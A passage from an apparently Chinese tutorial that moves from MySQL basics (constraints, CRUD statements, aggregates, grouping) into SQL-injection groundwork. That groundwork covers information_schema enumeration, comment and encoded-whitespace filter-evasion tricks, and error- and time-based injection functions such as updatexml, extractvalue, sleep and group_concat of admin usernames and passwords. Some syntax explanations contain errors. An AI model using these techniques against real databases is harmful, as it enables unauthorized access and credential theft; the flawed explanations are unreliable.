alt="img"></p><h4 id="在创建表时设置复合主键"><a class="markdownIt-Anchor" href="#在创建表时设置复合主键">#</a> 在创建表时设置复合主键</h4><ul><li><ul><li>主键由多个字段联合组成，语法规则如下：</li></ul></li></ul><p>PRIMARY KEY [字段 1，字段 2，…, 字段 n]；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624955343429-d65002a0-3f2d-4a16-a6d2-6af1919e59d8.png" alt="img"></p><h4 id="在修改表时添加主键约束"><a class="markdownIt-Anchor" href="#在修改表时添加主键约束">#</a> 在修改表时添加主键约束</h4><ul><li><ul><li>在修改数据表时添加主键约束的语法规则为：</li></ul></li></ul><p>ALTER TABLE 表名 ADD PRIMARY KEY (字段名);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624955444811-bff6a946-740e-4f41-b988-35d98f271057.png" alt="img"></p><h4 id="mysql唯一约束unique-key"><a class="markdownIt-Anchor" href="#mysql唯一约束unique-key">#</a> MySQL 唯一约束（UNIQUE KEY）</h4><p><span class="exturl" data-url="aHR0cDovL2MuYmlhbmNoZW5nLm5ldC9teXNxbC8=">MySQL</span> 唯一约束（Unique Key）要求该列唯一，允许为空，但只能出现一个空值。唯一约束可以确保一列或者几列不出现重复值。</p><p>在定义完列之后直接使用 UNIQUE 关键字指定唯一约束，语法规则如下：</p><p>&lt;字段名&gt; &lt; 数据类型 &gt; UNIQUE</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624955931440-b55e2898-adbe-4922-876e-645a52224714.png" alt="img"></p><h4 id="mysql查看表中的约束"><a class="markdownIt-Anchor" href="#mysql查看表中的约束">#</a> MySQL 查看表中的约束</h4><p>查看数据表中的约束语法格式如下：</p><p>SHOW CREATE TABLE &lt;数据表名&gt;;</p><h2 id="2sql之增删改查"><a class="markdownIt-Anchor" href="#2sql之增删改查">#</a> 2：SQL 之增删改查</h2><h3 id="21添加数据"><a class="markdownIt-Anchor" href="#21添加数据">#</a> 2.1：添加数据</h3><h4 id="1为表中所有字段添加数据"><a class="markdownIt-Anchor" href="#1为表中所有字段添加数据">#</a> ①：为表中所有字段添加数据</h4><p>i：INSERT 语句中指定所有字段名</p><p><strong>语法：INSERT INTO 表名 (字段名 1，字段名 2，…) VALUES (值 1，值 2，…);</strong></p><p>例题：向 student 表中插入（id 为 1，姓名：xiaoqiao，年龄：18，性别：woman，生日：2002）数据。</p><p>insert into student(id,name,age,sex,birthday) values(1,“xiaoqiao”,18,“woman”,“2002”);</p><p>ii：INSERT 语句中不指定字段名</p><p>语法：INSERT INTO 表名 VALUES (值 11，值 2，…);</p><p>例题：向 student 表中插入（id 为 2，姓名：daqiao，年龄：20，性别：woman，生日：2004）数据。</p><p>insert into student values(2,“daqiao”,20,“woman”,“2000”);</p><p><strong>此用法添加的数据数量、数据类型必须要与表中的字段保持一致</strong></p><h4 id="2为表的指定字段添加数据"><a class="markdownIt-Anchor" href="#2为表的指定字段添加数据">#</a> ②：为表的指定字段添加数据</h4><p>i：为指定字段添加数据，即只向部分字段添加值，而其它字段的值为表定义时的默认值。</p><p><strong>语法：INSERT INTO 表名（字段 1，字段 2，…）VALUES (值 1，值 2，…);</strong></p><p>例题：向 student 表中插入（id 为 3，姓名：zhouyu，年龄：18，）数据。</p><p>insert into student(id,name,age) values(3,“xaoqiao”,18);</p><h4 id="3同时添加多条数据"><a class="markdownIt-Anchor" href="#3同时添加多条数据">#</a> ③：同时添加多条数据</h4><p><strong>语法：INSERT INTO 表名 (字段名 1，字段名 2，…) VALUES （值 1，值 2，…),(值 1，值 2);</strong></p><p>例题：向 student 表中插入（id 为 4，姓名：sunce，年龄：20，性别：man，生日：2004）和（id 为 5，姓名：caocao，年龄：20，性别：man，生日：2004）数据</p><p>insert into student values(4,“sunce”,20,“man”,“2000”),(5,“caocao”,20,“man”,“2000”);</p><h3 id="22删除数据"><a class="markdownIt-Anchor" href="#22删除数据">#</a> 2.2：删除数据</h3><h4 id="1删除部分数据"><a class="markdownIt-Anchor" href="#1删除部分数据">#</a> ①：删除部分数据</h4><p>i：即删除指定的部分数据，需要使用 WHERE 子句来指定删除记录的条件。（符合 where 的记录将会被删除）</p><p><strong>语法：DELETE FROM 表名 WHERE 条件表达式；</strong></p><p>例题：向 student 表中删除 id 为 1 的数据。</p><p>delete from student where id=1;</p><h4 id="2删除全部数据"><a class="markdownIt-Anchor" href="#2删除全部数据">#</a> ②：删除全部数据</h4><p>i：若 DELETE 语句中没有使用 WHERE 语句，则会将表中所有记录都删除。</p><p><strong>语法：DELETE FROM 表名；</strong></p><p>例题：向 student 表中删除所有的数据。</p><p>delete from student ;</p><h3 id="23修改数据"><a class="markdownIt-Anchor" href="#23修改数据">#</a> 2.3：修改数据</h3><h4 id="1update-更新部分数据"><a class="markdownIt-Anchor" href="#1update-更新部分数据">#</a> ①：UPDATE 更新部分数据</h4><p>i：指更新指定表中的指定记录，使用 WHERE 子句来指定。</p><p><strong>语法：UPDATE 表名 SET 字段名 1 = 值 1，[，字段名 2 = 值 2，…] [ WHERE 条件表达式 ]；</strong></p><p>例题：向 student 表中 id 为 1 的数据中字段 age 改为 16，字段 birthday 改为 2004。</p><p>update student set age=16,birthday=2004 where id=1;</p><h4 id="2update-更新全部数据"><a class="markdownIt-Anchor" href="#2update-更新全部数据">#</a> ②：UPDATE 更新全部数据</h4><p>i：若 UPDATE 语句中没有使用 WHERE 语句，则会将表中所有记录都删除。</p><p><strong>语法：UPDATE FROM 表名；</strong></p><p>例题：向 student 表中将 age 字段都该为 17。</p><p>update student set age=17;（表中所有的数据中的 age 字段的值都将改变为 17）</p><h3 id="24查询数据"><a class="markdownIt-Anchor" href="#24查询数据">#</a> 2.4：查询数据</h3><h4 id="1简单查询"><a class="markdownIt-Anchor" href="#1简单查询">#</a> ①：简单查询</h4><p>i：查询所有字段</p><p><strong>语法：SELECT 字段名 1，字段名 2，…FROM 表名；</strong></p><p>例题：查询 student 表中所有数据。</p><p>SELECT id,name,age ,sex,birthday  FROM student;</p><p>select * from student;（“*” 为通配符，查询所有满足条件的 jilu）</p><p>ii：查询指定的部分字段</p><p>语法：SELECT 字段名 1，字段名 2，… FROM 表名；</p><p>例题：查询 student 表中所有的 name 字段和 sex 字段。</p><p>SELECT name,sex FROM student;</p><p>注意：字段顺序可以更改，则显示的结果也会作出对应的调整。</p><p>（可以指定 where 来筛选指定条件的记录）</p><h4 id="2按条件查询"><a class="markdownIt-Anchor" href="#2按条件查询">#</a> ②：按条件查询</h4><ol><li><ol><li>带关系运算符的查询</li></ol></li></ol><p>语法：SELECT 字段名 1，字段名 2，…FROM 表名 WHERE 条件表达式；</p><p>例题：查询 student 表中 id 为 4 的人的 id 和 name 字段。</p><p>SELECT id,name FROM student  WHERE id=4;</p><ol><li><ol start="2"><li>带 IN 关键字的查询（在… 里面）</li></ol></li></ol><p>语法：SELECT * 字段名 1, 字段名 2,…FROM 表名 WHERE 字段名 [NOT]  IN （元素 1，元素 2，…）；</p><p><strong>解释：IN 关键字用于判断某个字段的值是否在指定集合中，若在，则该字段所在的记录将会被查询出来</strong></p><p>例题：查询 student 表中 id 值为 1,2,3 的记录。</p><p>SELECT * FROM student WHERE  id IN (1,2,3);</p><ol><li><ol start="3"><li>带 BETWEEN AND  关键字的查询 (在… 之间)</li></ol></li></ol><p>语法：SELECT *  {字段名 1, 字段名 2,… FROM  表名 WHERE 字段名 [ NOT] BETWEEN  值 1  AND  值 2；</p><p><strong>解释：BETWEEN AND 用于判断某个字段的值是否在指定范围之内，若在，则该字段所在的记录会被  查询出来，反之不会。</strong></p><p>例题：查询 student 表中 id 值在 2~5 之间的人的 id 和 name。</p><p>SELECT id,name FROM student WHERE id BETWEEN 2 AND 5;</p><ol><li><ol start="4"><li>空值查询</li></ol></li></ol><p>语法：SELECT *  字段名 1，字段名 2，…FROM 表名 WHERE 字段名 IS [NOT] NULL</p><p><strong>解释：在数据表中有些值可能为空值（NULL），空值不同于 0，也不同于空字符串，需要使用 IS NULL 来判断字段的值是否为空值。</strong></p><p>例题：查询 student 表中 sex 值为空值的记录。</p><p>SELECT * FROM student WHERE sex IS NULL;</p><p><strong>注意：IS NOT NULL 关键字用来查询字段不为空值的记录。</strong></p><ol><li><ol start="5"><li>带 DISTINCT 关键字的查询</li></ol></li></ol><p>语法：SELECT DISTINCT 字段名 FROM 表名；</p><p>解释：很多表中某些字段的数据存在重复的值，可以使用 DISTINCT 关键字来过滤重复的值，只保留一个值。</p><p>例题：查询 student 表中 birthday 字段的值，结果中不允许出行重复的值。</p><p>SELECT DISTINCT birthday FROM student;</p><ol><li><ol start="6"><li>带 LIKE 关键字的查询</li></ol></li><li><ol><li><ol><li>百分号（%）通配符 **(% 在这里表示任意的意思，它可以匹配任意长度且满足条件的字符串)**</li></ol></li></ol></li></ol><p>语法：SELECT *  | 字段名 1，字段名 2，…FROM 表名 WHERE 字段名 [NOT] LIKE ‘匹配字符串’;</p><p>解释：匹配任意长度的字符串，包括空字符串。例如，字符串 “c%” 匹配以字符 C 开始，任意长度的字符串，如 “ ct  ”，“ cut ”，“ current ” 等；字符串 “ c% g ” 表示以字符 c 开始，以 g 结尾的字符串；字符串 “ % y% ” 表示包含字符 “ y ” 的字符串，无论 “ y ” 在字符串的什么位置。</p><p>例题：查询 student 表中 name 字段以字符 “s” 开头的人的 id,name。</p><p>SELECT id,name FROM student  WHERE name LIKE “s%”;</p><ol><li><ol><li><ol start="2"><li>下划线（_）通配符（只能匹配指定个数的字符串，一个 &quot;-&quot; 表示一个字符）</li></ol></li></ol></li></ol><p>语法：SELECT * | 字段名 1，字段名 2，…FROM 表名 WHERE 字段名 [NOT] LIKE ‘匹配字符串’;</p><p>解释：下划线通配符只匹配单个字符，若要匹配多个字符，需要使用多个下划线通配符。例如，字符串 “cu_” 匹配以字符串 “ cu ” 开始，长度为 3 的字符，如 “ cut ”，“ cup ”；字符串 “ c_ <em>l” 匹配在 “c” 和 “ l ” 之间包含两个字符的字符串，如 “ cool ”。需要注意的是，在连续使用 “-” 之间不能有空格，例如 “M</em> _QL” 只能匹配 “MySQL”，不能匹配 “My SQL”。</p><p>例题：查询 student 表中 name 字段值以 “xia” 开始，以 “ qiao ” 结束，并且中间只有一个字符的记录。</p><p>SELECT * FROM student WHERE name LIKE ‘xia_qiao’;</p><p>注意：若要查询的字段值本来就含有 “%” 或者 “ _ ”, 则要用 “ \ ” 进行转义，如要<strong>查询本身含有 “%” 的字符串，命令应改为 “ %%%”。</strong></p><ol><li><ol start="3"><li>带 AND 关键字的多条件查询（表示交集的关系，&amp; 运算）</li></ol></li></ol><p>语法：SELECT * | 字段名 1，字段名 2，…FROM 表名；</p><p><strong>解释：在使用 SELECT 语句查询数据时，为了增加查询的准确性，可以使用 AND 关键字可以连接两个或多个查询条件。</strong></p><p>例题：查询 student 表中 id 字段小于 5，并且 sex 字段值为 “woman” 的人的 id 和 name</p><p>SELECT id,name FROM student WHERE id&lt;5 AND sex=‘woman’;</p><ol><li><ol start="4"><li>带 OR 关键字的多条件查询（表示并集的关系，|| 运算）</li></ol></li></ol><p>语法：SELECT * | 字段名 1，字段名 2，…FROM 表名 WHERE 条件表达式 1 OR 条件表达式 2 [… OR 条件表达式 n];</p><p>解释：与 AND 关键字不同，OR 关键字只要满足任意一个条件就会被查询出来。</p><p>例题：查询 student 表中 id 字段小于 5，或者 sex 字段值为 “woman” 的人的 id 和 name</p><p>SELECT id,name FROM student WHERE id&lt;5 OR sex=‘woman’;</p><ol><li><ol><li>OR 和 AND 一起使用的情况</li></ol></li></ol><p>语法：SELECT * | 字段名 1，字段名 2，…FROM 表名；</p><p>解释：<strong>OR 和 AND 一起使用的时候，AND 的优先级高于 OR，因此二者一起使用时，会先运算 AND 两边的表达式，再运算 OR 两边的表达式。</strong></p><p>例题：查询 student 表中 sex 值为 “woman” 或者 sex 值为 “man” 并且 age 字段值为 16 的人的记录</p><p>SELECT * FROM student WHERE sex=‘woman’ OR sex=‘man’  AND age=16;</p><h4 id="3聚合函数"><a class="markdownIt-Anchor" href="#3聚合函数">#</a> ③：聚合函数</h4><h4 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623394440546-a0aaffed-cd97-4d61-ad82-9d76a4ddb747.png" alt="img"></h4><ol><li><ol><li>COUNT () 函数：统计所查询的满足条件的记录的总数</li></ol></li></ol><p>语法：SELECT COUNT (*) FROM 表名；</p><p>例题：查询 student 表中一共有多少条记录。</p><p>SELECT COUNT(*) FROM student;</p><ol><li><ol><li>SUM () 函数：求出表中某个字段所有值的总和</li></ol></li></ol><p>语法：SELECT  SUM (字段名) FROM 表名；</p><p>例题：查询 student 表中 age 字段的总和</p><p>SELECT SUM(age) FROM student;</p><ol><li><ol><li>AVG () 函数：求出表中某个字段所有值的平均值</li></ol></li></ol><p>语法：SELECT AVG (字段名) FROM 表名；</p><p>例题：查询 student 表中表中 age 字段的平均值。</p><p>SELECT AVG(age) FROM student;</p><ol><li><ol><li>MAX () 函数：求出表中某个字段所有值的最大值</li></ol></li></ol><p>语法：SELECT MAX (字段名) FROM 表名；</p><p>例题：查询 student 表中 age 字段的最大值</p><p>SELECT MAX(age) FROM student;</p><ol><li><ol><li>MIN () 函数：求出表中某个字段所有值的最小值</li></ol></li></ol><p>语法：SELECT MIN (字段名) FROM 表名；</p><p>例题：查询 student 表中 grade 字段的最小值</p><p>SELECT MIN(age) FROM student;</p><h4 id="4对查询结果进行排序"><a class="markdownIt-Anchor" href="#4对查询结果进行排序">#</a> ④：对查询结果进行排序</h4><ol><li><ol><li>带 ORDER BY 关键字的排序</li></ol></li></ol><p>语法：SELECT 字段名 1，字段名 2，…FROM 表名 ORDER BY 字段名 1 [ASC | DESC], 字段名 2 [ ASC | DESC ]…;</p><p>解释：在该语法中指定的字段名是对查询结果进行排序的依据 **，ASC 表示升序排列，DESC 表示降序排列，默认情况是升序排列 **。</p><p>例题：查询 student 表中的所有记录，并按照 age 字段进行升序排序</p><p>SELECT * FROM student ORDER BY age;</p><ol><li><ol><li>带 GROUP BY 关键字的分组查询</li></ol></li></ol><p>语法：SELECT  字段名 1，字段名 2，…FROM 表名 GROUP BY 字段名 1，字段名 2，… [HAVING 条件表达式];</p><p>解释：在对表中数据进行统计的时候，可以使用 GROUP BY 按某个字段或者多个字段进行分组，<strong>字段中值相同的为一组</strong>，如男生分为一组，女生分为一组。</p><p><strong>注意点使用 * 无法查询解决方法：</strong></p><p><strong>1. 关闭 ONLY_FULL_GROUP_BY</strong></p><p>** 查询：**SELECT @@sql_mode;</p><p>** 关闭：**SET SESSION sql_mode=(SELECT REPLACE (@@sql_mode,‘ONLY_FULL_GROUP_BY,’,’’));</p><ol><li><ol><li><ol><li>单独使用 GROUP BY 进行分组</li></ol></li></ol></li></ol><p>解释：单独使用 GROUP BY 关键字，查询的是每个分组中的一条记录。</p><p>例题：查询 student 表中的数据，按照 sex 字段进行分组</p><p>SELECT * FROM student GROUP BY sex;</p><ol><li><ol><li><ol start="2"><li>GROUP BY 和聚合函数一起使用</li></ol></li></ol></li></ol><p>解释：GROUP BY 和聚合函数一起使用，可以统计出某个或者某些字段在一个分组中的最大值、最小值、平均值等。</p><p>例题：查询 student 表中按照 age 字段进行分组查询，计算出每组共有多少个人。</p><p>SELECT COUNT(*) ,age FROM student GROUP BY age;</p><ol><li><ol><li><ol start="3"><li>GROUP BY 和 HAVING 关键字一起使用</li></ol></li></ol></li></ol><p>解释：关键 HAVING 字和 WHERE 关键字的作用相同，区别在于 HAVING 关键字可以跟聚合函数，而 WHERE 关键字不能。通常 HAVING 关键字都和 GROUP BY 一起使用，用于对分组后的结果进行过滤。</p><p>例题：查询 student 表中按照 sex 字段进行分组查询，查询出 age 字段值之和小于 300 的分组</p><p>SELECT sum(age),sex FROM student GROUP BY sex HAVING SUM(age) &lt; 300;</p><ol><li><ol start="4"><li>使用 LIMIT 限制查询结果的数量</li></ol></li></ol><p>语法：SELECT 字段名 2，字段名 2，…FROM 表名 LIMIT 记录数 [OFFSET] 记录数   LIMIT Y OFFSET X 向后偏移 x 位。</p><p>解释：在此语法中，LIMIT 后面可以跟两个参数，第一个参数 “OFFSET” 表示偏移量，如果偏移量为 0，则从查询结果的第一条记录开始，偏移量为 1 则从查询结果中的第二条记录开始，以此类推。OFFSET 为可选值，默认值为 0，第二个参数 “记录数” 表示指定返回查询记录的条数。</p><p>例题：查询 tudent 表中的前四条记录</p><p>SELECT * FROM student LIMIT 4;</p><p>例题：查询 student 表中从 0 开始查询 4 条记录</p><p>SELECT * FROM student LIMIT 0,4;</p><h4 id="5为表和字段取别名"><a class="markdownIt-Anchor" href="#5为表和字段取别名">#</a> ⑤：为表和字段取别名</h4><ol><li><ol><li>为表取别名</li></ol></li></ol><p>语法：SELECT * FROM 表名 [AS] 别名；</p><p>解释：在进行查询操作时，如果表名很长使用起来不方便，可以为表取一个别名来代替表的名称。</p><p>例题：为 student 表起一个别名 s，并查询 student 表中 sex 字段值为 “woman” 的记录</p><p>SELECT * FROM student AS s WHERE s.sex=‘woman’;</p><ol><li><ol><li>为字段取别名</li></ol></li></ol><p>语法：SELECT 字段名 [AS] 别名 [ , 字段名 [AS] 别名，…]  FROM 表名 ；</p><p>例题：查询 student 表中的所有记录的 name 和 sex 字段值，并为这两个字段起别名 stu_name 和 stu_sex</p><p>SELECT name AS stu_name,sex AS stu_gender FROM student;</p><h4 id="6子查询"><a class="markdownIt-Anchor" href="#6子查询">#</a> ⑥：子查询</h4><p>select name from student where id &lt; (select age from student where name=‘sunce’);</p><h4 id="7联合查询union"><a class="markdownIt-Anchor" href="#7联合查询union">#</a> ⑦：联合查询 (union)</h4><p>联合查询 union 两边的查询语句所返回的结构必须相同</p><p>select version() union select user();</p><h4 id="8利用内置表查询"><a class="markdownIt-Anchor" href="#8利用内置表查询">#</a> ⑧：利用内置表查询</h4><p>查询数据库：select schema_name from information_schema.schemata;</p><p>查询表名：select table_name from information_schema.tables;</p><p>查询列名：select column_name from information_schema.columns;</p><h2 id="3mysql内置库"><a class="markdownIt-Anchor" href="#3mysql内置库">#</a> 3：MySQL 内置库</h2><p>在 MySQL&gt;5.0 的版本中，把 information_schema 看作是一个自带的内置数据库，确切说是信息数据库。它保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624967706011-2b5e90b5-ea52-4107-97a0-d99cb6039107.png" alt="img"></p><p>这里我们重点学习下 schemata、tables、columns 以及相关的字段名。</p><p>schemata 表：这里重点关注 schema_name 这个字段，它存放着所有数据库库名，在 SQL 注入中我们可以使用它来进行来查询所有数据库，然后进行高权限的跨库查询。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624967811455-d3098f47-9ed7-4a22-9401-701bf34b31b4.png" alt="img"></p><p>tables 表：tables 表用来存储所有数据库里的表名等信息，其中 table_schema 列用来存放所有数据库的库名，table_name 用来存放 MySQL 数据库中的所有表名。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624967881665-67dbdee8-bac7-4300-91d8-944fab32f5ef.png" alt="img"></p><p>columns 表：columns 表用来存放数据库里的所有字段信息，其中 table_schema 列用来存放数据库库名，table_name 列用来存放所有数据库里的所有表名，column_name 列用来存放所有的字段 / 内容 (值)。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624967944575-c3a0814a-eef7-4f50-a9ad-20eb70b335f7.png" alt="img"></p><h2 id="4sql中tips"><a class="markdownIt-Anchor" href="#4sql中tips">#</a> 4：SQL 中 tips</h2><h3 id="41符号运用"><a class="markdownIt-Anchor" href="#41符号运用">#</a> 4.1：符号运用</h3><p>=        数据库的赋值符号</p><p>or/||                逻辑或 左右两边有一条成立 那么返回 true 否则 false</p><p>xor            逻辑异或。 如果任一操作数为 NULL，则返回 NULL。 对于非 NULL 操作数，如果奇数个操作数非零，则求值为 1，否则返回 0。<strong>（相同为 0，不同为 1，n 个非零元素异或，当 n=even 是，结果为 0，否则为 1。任意与 0 异或结果为 0）</strong></p><p>&amp;&amp;/And     逻辑与，并且的意思  左右两边的条件必须同时成立则返回 true 否则返回 false</p><p>NOT/！ 逻辑非（取反）</p><p>+、-、*、/    运算符 加减乘除</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929024527-b541b18d-8b6e-43f9-82ab-831a9e5c9923.png" alt="img"></p><h3 id="42常用注释符"><a class="markdownIt-Anchor" href="#42常用注释符">#</a> 4.2：常用注释符</h3><p><strong>在 MySQL 中，常见的注释符有以下几种：</strong></p><ul><li><ul><li><ul><li>#</li><li>–空格</li></ul></li></ul></li><li><ul><li><ul><li>/**/</li></ul></li></ul></li></ul><p><strong>内联注释符及特性：</strong></p><ul><li><ul><li><ul><li>/*！code */</li><li>内联注释符是一种基于注块注释衍生出来的注释风格，它可以用于整个 SQL 语句中，用来执行 SQL 语句，内联注释有个特殊点，和 MySQL 版本息息相关，也就是 **：** 当内联注释中出现小于或等于当前版本号的时候，内联注释符里的子句会被执行，大于时则不会被执行，注意版本的写法，例如，5.5.34，在内联注释中需要写为 50534，版本号第二位加 0，然后注意版本号和内联注释中间不能有空格。</li></ul></li></ul></li></ul><p><strong>常见的空格符号：</strong></p><ul><li><ul><li><ul><li>两个空格代替一个空格，用 Tab 代替空格，% a0 = 空格</li><li>%20 (空格)  %09 (tab)  %0a (回车符)  %0b  %0c  %0d  % a0 (空格)  %00  /**/   /<em>!</em>/</li></ul></li></ul></li></ul><h3 id="43内联注释"><a class="markdownIt-Anchor" href="#43内联注释">#</a> 4.3：内联注释</h3><p>select user()/<em>version()</em>/;</p><h3 id="44常见空格表示符号"><a class="markdownIt-Anchor" href="#44常见空格表示符号">#</a> 4.4：常见空格表示符号</h3><p>两个空格代替一个空格，用 Tab 代替空格，%0a = 空格</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /<em>!</em>/</p><h2 id="5注入中常见的sql函数"><a class="markdownIt-Anchor" href="#5注入中常见的sql函数">#</a> 5：注入中常见的 sql 函数</h2><h4 id="51rand函数-生成一个0~1之间的随机数"><a class="markdownIt-Anchor" href="#51rand函数-生成一个0~1之间的随机数">#</a> 5.1：rand () 函数   // 生成一个 0~1 之间的随机数</h4><p>语句：select rand ();</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929148650-eccd1dda-ba29-4049-b816-168c0f64fa09.png" alt="img"></p><h4 id="52floor函数-向下取整"><a class="markdownIt-Anchor" href="#52floor函数-向下取整">#</a> 5.2：floor () 函数  // 向下取整</h4><p>语句：select floor (rand ()*2);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929209234-04ac7c50-08e5-4c88-a27e-8ff3c14ef347.png" alt="img"></p><h4 id="53concat函数-将符合条件的同一列中的不同行数据进行拼接选择好数据库"><a class="markdownIt-Anchor" href="#53concat函数-将符合条件的同一列中的不同行数据进行拼接选择好数据库">#</a> 5.3：concat () 函数  // 将符合条件的同一列中的不同行数据进行拼接，选择好数据库</h4><p>语句：concat (0x3a,database (),0x3a)；0x3a 为：号（将第一个参数所对应的符号加在数据库名的前面，将第三个参数所对应的符号加在数据库名的后面，1 与 3 的参数可以不同）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929359753-7f7979eb-dba0-48a3-8981-e84695b086fb.png" alt="img"></p><h4 id="54concat_ws函数-第一个参数是其它参数的分隔符-分隔符的位置在连接的两个字符串之间"><a class="markdownIt-Anchor" href="#54concat_ws函数-第一个参数是其它参数的分隔符-分隔符的位置在连接的两个字符串之间">#</a> 5.4：concat_ws () 函数 // 第一个参数是其它参数的分隔符。分隔符的位置在连接的两个字符串之间。</h4><p>语句：select concat_ws (’!’,database (),‘haha’);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929389387-5572ea2e-3a07-4d95-b94e-fde752a8cb0b.png" alt="img"></p><h4 id="55group_concat"><a class="markdownIt-Anchor" href="#55group_concat">#</a> 5.5：group_concat</h4><p>语句：select group_concat (username,’~’,password) from dh_admin_user;（将从表中所查询的两个数据之间用 “~” 连接）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624931767147-af72cb2c-ed63-4ec2-a0ea-1256df921083.png" alt="img"></p><h4 id="56extractvalue函数-对xml文档进行查询的函数-语法extractvalue目标xml文档xml路径"><a class="markdownIt-Anchor" href="#56extractvalue函数-对xml文档进行查询的函数-语法extractvalue目标xml文档xml路径">#</a> 5.6：extractvalue () 函数  // 对 xml 文档进行查询的函数  语法：extractvalue (目标 xml 文档，xml 路径).</h4><p>语句：select extractvalue (‘anything’,concat (’~’,(select user ())));</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929938865-59d56ded-02a0-4bb3-8837-1474b8fc16d2.png" alt="img"></p><h4 id="57sleep函数-对数据库进行延时的函数-语法后面直接跟需要延时的时间即可默认单位为s"><a class="markdownIt-Anchor" href="#57sleep函数-对数据库进行延时的函数-语法后面直接跟需要延时的时间即可默认单位为s">#</a> 5.7：sleep () 函数  // 对数据库进行延时的函数  语法：后面直接跟需要延时的时间即可，默认单位为 s</h4><p>语句：select sleep (5);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624929977076-b73b5d9b-b4db-4684-ae9f-029cc07ce860.png" alt="img"></p><h4 id="58updatexml-语法updatexml目标xml文档xml路径更新的内容"><a class="markdownIt-Anchor" href="#58updatexml-语法updatexml目标xml文档xml路径更新的内容">#</a> 5.8：updatexml ()  // 语法 updatexml (目标 xml 文档，xml 路径，更新的内容)</h4><p>语句：select  updatexml (‘anything’,concat (’~’,(select version ())),‘xxx’);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930123017-4d848866-90d2-4ef4-bdb7-2a4b53a42e41.png" alt="img"></p><h4 id="59exp函数-此函数返回e自然对数的底的x次方的值用于将e提升为指定数字的幂当传递一个大于709的值时函数exp就会引起一个溢出错误"><a class="markdownIt-Anchor" href="#59exp函数-此函数返回e自然对数的底的x次方的值用于将e提升为指定数字的幂当传递一个大于709的值时函数exp就会引起一个溢出错误">#</a> 5.9：exp () 函数  // 此函数返回 e (自然对数的底) 的 X 次方的值，用于将 E 提升为指定数字的幂，当传递一个大于 709 的值时，函数 exp () 就会引起一个溢出错误。</h4><p>语句：select exp (2);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930667186-832c967d-009b-48a4-99f6-a41dce583328.png" alt="img"></p><h4 id="510length函数-返回参数的长度"><a class="markdownIt-Anchor" href="#510length函数-返回参数的长度">#</a> 5.10：length () 函数 // 返回参数的长度</h4><p>语句：select length (user ());</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930725308-365094cc-7005-4216-84f5-a5e11ae4980e.png" alt="img"></p><h4 id="511substr函数-从字符串-s-的-start-位置截取长度为-length-的子字符串select-substruser12"><a class="markdownIt-Anchor" href="#511substr函数-从字符串-s-的-start-位置截取长度为-length-的子字符串select-substruser12">#</a> 5.11：substr () 函数  // 从字符串 s 的 start 位置截取长度为 length 的子字符串，select substr (user (),1,2);</h4><p>语句：select substr (user (),1,2);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930882499-d7677dca-e200-4ad1-93c8-8e8a6706222c.png" alt="img"></p><h4 id="512substring函数left-mid函数-同substr"><a class="markdownIt-Anchor" href="#512substring函数left-mid函数-同substr">#</a> 5.12：substring () 函数，left () ,mid () 函数  // 同 substr</h4><p>语句：select substring (user (),1,2);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930922336-8bb88c57-3926-4b59-b0ff-b11e61283af2.png" alt="img"></p><p>语句：select left (user (),5);（从左开始的前 n 个元素）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624930980586-47f5ecd5-6cdf-4723-a569-2ff1a8f50c0b.png" alt="img"></p><p>语法：select mid (user (),1);（除去从左开始的 n-1 个元素）</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624931908776-b7abf795-40c1-4823-b882-d4487316f3be.png" alt="img"></p><h4 id="513ascii-ord函数返回第一个字符的ascii码-返回字符的ascii码"><a class="markdownIt-Anchor" href="#513ascii-ord函数返回第一个字符的ascii码-返回字符的ascii码">#</a> 5.13：ascii ()、ord () 函数返回第一个字符的 ascii 码  // 返回字符的 ascii 码</h4><p>语句：select ascii (mid (user (),1));</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624931962396-a342ce33-66c9-4e78-9630-c843375f6b54.png" alt="img"></p><p>语句：select ord (mid (user (),1));</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624932124508-2b7890f3-dd57-4e32-8b0f-129615c1e249.png" alt="img"></p><h4 id="514name_const函数-构造一个临时列列名为xx值为xx"><a class="markdownIt-Anchor" href="#514name_const函数-构造一个临时列列名为xx值为xx">#</a> 5.14：name_const () 函数  // 构造一个临时列，列名为 xx, 值为 xx</h4><p>语句：select name_const (‘name’,15);</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624932717111-cbe16c5f-28c6-41e8-80c6-19cff66271ce.png" alt="img"></p><h4 id="515strcmp函数-strcmp函数是string-compare字符串比较的缩写用于比较两个字符串并根据比较结果返回整数-基本形式为strcmpstr1str2若str1str2则返回零若str1str2则返回负数若str1str2则返回正数"><a class="markdownIt-Anchor" 